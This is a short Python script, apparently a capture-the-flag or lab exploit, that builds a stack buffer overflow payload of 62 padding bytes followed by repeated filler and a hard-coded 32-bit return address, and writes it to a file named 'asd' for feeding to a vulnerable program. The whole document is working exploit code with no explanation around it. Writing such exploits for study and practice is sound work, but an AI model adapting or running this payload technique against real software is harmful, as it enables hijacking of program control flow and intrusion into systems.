#######
# UwU #
#######

offs = b'A' * 6
addr = b'\x5a\x84\x04\x08'

exploit = b'A'*62 + offs + addr + offs + addr + offs + addr

f = open('asd', 'wb')
f.write(exploit)
f.close()
